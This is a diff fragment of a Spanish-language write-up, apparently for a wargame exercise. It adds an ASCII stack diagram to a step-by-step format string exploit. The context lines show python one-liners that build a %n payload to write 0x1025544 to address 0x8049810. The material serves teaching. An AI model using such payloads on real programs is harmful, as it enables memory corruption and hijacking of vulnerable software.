@@ -65,6 +65,31 @@
 11.- Necesitamos inyectar el valor de 0x1025544 (16930116 en decimal) en el parametro 12 para eso usaremos el padding, 
   la flag %n y el cambio de posiciín con 12$
 
+    -------------
+    | 0x8049810 |<---
+    -------------   |
+                    |
+    high adr        .   
+    -------------   .
+    | stack p   |   .
+    -------------   |
+    | ...       |   |
+    -------------   | <- (0x1025544)
+    | ...       |   |
+    -------------   |
+    | ...       |   |
+    -------------   |
+   *| stack n   |   |
+    -------------   |
+    | ...       |   |
+    -------------   |
+    | ...       |   |
+    -------------   |
+    | arbitrary |   |
+    | adr       |----
+    -------------
+    low adr
+
 12.- La cadena debe quedar así
   python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/payload
   python -c 'import sys; sys.stdout.buffer.write(b"\x10\x98\x04\x08" + b"%16930112d%4$n")' > payload
